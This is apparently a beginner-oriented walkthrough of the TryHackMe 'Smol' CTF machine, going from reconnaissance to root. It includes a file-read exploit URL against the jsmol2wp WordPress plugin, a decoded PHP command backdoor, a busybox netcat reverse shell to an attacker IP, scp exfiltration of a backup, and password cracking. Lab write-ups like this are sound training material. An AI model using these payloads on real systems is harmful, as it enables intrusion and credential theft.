# Smol CTF Tryhackme
# THM : Smol

## THM : smol — Beginner-Friendly Guided Walkthrough

***Author: Nikita Panwar***

> This guide explains what to do, what to look for, and why each step matters, so even someone new to CTFs can follow along confidently.
> 

---

![image.png](attachment:bb95a758-72aa-4600-bf4f-ffe668dda49d:image.png)

## 🎯 Goal of the Machine

The goal of this machine is to:

1. Find exposed services
2. Exploit a vulnerable WordPress website
3. Gain a remote shell
4. Extract user credentials
5. Escalate privileges to root

Think of this as **slowly peeling layers** off the system.

---

## 🔍 Step 1: Reconnaissance (Finding Attack Surface)

### 🛠 Why Start with Nmap?

Before attacking anything, we must know:

- What services are running?
- Which ports are open?
- What technologies are being used?

This helps us decide **where to attack**.

### 🔎 Nmap Scan

```bash
nmap -sC -sV -p- 10.48.132.36
```

**What this does:**

- `sC`: Runs default scripts (basic vulnerability checks)
- `sV`: Detects service versions
- `p-`: Scans all TCP ports

### 📊 Result Interpretation

```
22/tcp → SSH
80/tcp → HTTP
```

**What this means:**

- Port 80 = Web application (usually vulnerable)
- Port 22 = SSH (useful later after we get credentials)

➡️ **Decision:** Focus on the web server first.

---

## 🌐 Step 2: Fix Website Access (Hosts File)

### ❓ Why edit `/etc/hosts`?

The website redirects to `www.smol.thm`.

Without DNS, your browser cannot resolve this domain.

### 🛠 Fix Domain Resolution

```bash
echo"10.48.132.36 www.smol.thm" |sudotee -a /etc/hosts
```

Now the browser knows:

> “When I visit www.smol.thm, go to this IP.”
> 

---

## 📁 Step 3: Web Enumeration (Finding Hidden Pages)

### 🧠 Why Enumerate Directories?

Web apps often hide:

- Admin panels
- Config files
- Backup files

Directory brute-forcing helps uncover these.

### 🛠 Gobuster Scan

```bash
gobusterdir -u http://www.smol.thm -w /usr/share/wordlists/dirb/big.txt -x php -t 64 -r
```

### 🔍 Important Results

```
/wp-login.php
/wp-admin
/wp-content
/wp-config.php
/xmlrpc.php
```

### 🧠 What We Learn

These are **classic WordPress files**.

➡️ **Conclusion:**

The target is running **WordPress**, so we should use WordPress-specific tools.

---

## 🧪 Step 4: WordPress Enumeration (WPScan)

### ❓ Why WPScan?

WordPress often becomes vulnerable due to:

- Outdated plugins
- Misconfigured themes

WPScan automates this discovery.

### 🛠 WPScan Command

```bash
wpscan --url http://www.smol.thm
```

### 🔎 Key Finding

```
Vulnerable plugin: jsmol2wp
```

➡️ **This plugin is our entry point.**

---

## 💥 Step 5: Exploiting the Vulnerable Plugin

### ❓ Why Target wp-config.php?

`wp-config.php` contains:

- Database username
- Database password

These credentials often:

- Get reused
- Allow deeper access

### 🛠 Exploit URL

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```

### 🔐 Credentials Retrieved

```php
DB_USER = wpuser
DB_PASSWORD = kbLSF2Vop#lw3rjDZ629*Z%G
```

---

## 🔑 Step 6: WordPress Admin Login

### ❓ Why Login to WordPress?

Admin access allows:

- Viewing site files
- Finding backdoors
- Uploading malicious code

➡️ Use the credentials at:

```
http://www.smol.thm/wp-login.php
```

---

## 🚪 Step 7: Finding a Backdoor

### 🧠 Why Look for Backdoors?

CTF machines often:

- Hide backdoors in plugins
- Encode malicious PHP

### 🛠 Read `hello.php`

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?query=php://filter/resource=../../hello.php
```

This revealed Base64-encoded code.

---

## 🔓 Step 8: Decode and Analyze Backdoor

### 🔍 Decode Result

```php
if (isset($_GET["cmd"])) {system($_GET["cmd"]); }
```

### 🧠 Why This Matters

This allows:

- Command execution via URL
- Full server control

---

## 🧪 Step 9: Test Command Execution

```
http://www.smol.thm/wp-admin/index.php?cmd=whoami
```

Output:

```
www-data
```

➡️ We now have **Remote Code Execution (RCE)**.

---

## 🔄 Step 10: Get a Reverse Shell

### ❓ Why a Reverse Shell?

A shell allows:

- File access
- Privilege escalation
- Stable interaction

### 📡 Listener (Kali)

```bash
nc -lvnp 1234
```

### 🧨 Trigger Reverse Shell

```
http://www.smol.thm/wp-admin/index.php?cmd=busybox nc <KALI_IP> 1234 -e bash
```

---

## 🖥 Step 11: Stabilize the Shell

```bash
python3 -c'import pty; pty.spawn("/bin/sh")'
```

➡️ Gives a proper interactive shell.

---

## 🗄 Step 12: Database Dump

### ❓ Why Dump Database?

User credentials = lateral movement.

```sql
SHOW DATABASES;
USE wordpress;
SHOW TABLES;
SELECT*FROM wp_users;
```

---

## 🔓 Step 13: Crack Password Hashes

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Recovered:

```
sandiegocalfornia
```

---

## 👤 Step 14: User Flag

```bash
su diego
cat user.txt
```

---

## 🔑 Step 15: SSH Key Abuse

### ❓ Why SSH Keys?

If private keys are exposed:

- Passwords are not required
- Access is instant

```bash
chmod 600 id_rsa
ssh think@www.smol.thm -i id_rsa
```

---

## 📦 Step 16: Backup File Attack

```bash
scp /home/gege/wordpress.old.zip kali@<KALI_IP>:/home/kali/
```

Crack ZIP:

```bash
zip2john wordpress.old.zip > wphash
john wphash --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 👑 Step 17: Root Privilege Escalation

```bash
su - xavi
sudo su
```

---

## 🏁 Final Flag

```bash
cd /root
cat root.txt
```

---

---
